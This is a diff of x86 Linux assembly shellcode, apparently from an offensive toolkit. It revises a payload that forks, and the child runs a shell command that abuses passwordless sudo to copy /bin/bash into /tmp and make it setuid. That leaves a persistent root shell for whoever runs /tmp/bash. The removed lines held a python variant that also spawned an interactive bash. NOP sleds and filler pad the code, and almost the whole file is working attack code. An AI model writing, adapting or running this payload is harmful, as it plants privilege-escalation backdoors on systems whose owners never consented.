@@ -1,4 +1,4 @@
-; ptrex - MIT License - Copyright 2020
+; MIT License - Copyright 2020
 ; David Reguera Garcia aka Dreg - dreg@fr33project.org
 ; -
 ; http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
@@ -19,25 +19,45 @@
 ; IN THE SOFTWARE.
 
 section .text
-        global _start
-
+global  _start
 _start:
 
-        times 100 db 90h
+times 100 db 90h
 
-;         db 0CCh
+	mov eax, 2 ; fork
+	int 0x80
+	cmp eax, 0
+	jz child
+parent:
+        push 0
+        push 0
+        push 0
+        push 0
+        push 0
+        push 0
 
+        mov ebx, eax
+        mov ecx, 0
+        mov edx, 0
+        mov esi, 0
+        mov edi, 0
+        mov eax, 114 ; wait4
+        int 0x80
+
+        jmp end_sc
+
+child:
         push 0
         call lxz
-        db  `import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1"); import pty; pty.spawn("/bin/bash");`,0
-        times 250 db 41h
+;        arg2 db  `import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1");`,0
+        arg2 db  `/bin/echo | /usr/bin/sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | /usr/bin/sudo -S /usr/bin/chmod +s /tmp/bash >/dev/null 2>&1`,0
 lxz:
         call drgs
         db `-c`,0
 drgs:
         call zhu
-        db `/bin/python`,0
-        times 150 db 42h
+;        msg db `/bin/python`,0
+        msg db `/bin/sh`,0
 zhu:
         lea ecx, [esp]            ;argv
         mov ebx, [esp]            ;file
@@ -49,5 +69,5 @@ zhu:
         mov ebx, 0
         int 0x80
 
-        times 100 db 90h
-
+end_sc:
+times 1000 db 90h
